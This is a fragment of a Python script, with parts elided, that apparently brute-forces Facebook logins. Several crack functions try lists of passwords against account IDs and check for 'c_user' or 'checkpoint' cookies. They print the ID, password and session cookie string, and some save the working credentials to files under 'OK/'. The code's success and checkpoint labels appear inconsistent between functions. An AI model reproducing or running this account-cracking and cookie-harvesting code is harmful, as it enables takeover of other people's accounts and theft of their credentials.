    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[CHECKPOINT] {idf}|{pw}')
                ...
                print(f'\r\33[92m[SUCCESSFUL] {idf}|{pw} | {kuki}')
...
def crack2(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[CHECKPOINT] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
...
def crack3(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[SUCCESSFUL] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
                ...
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[CHECKPOINT] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
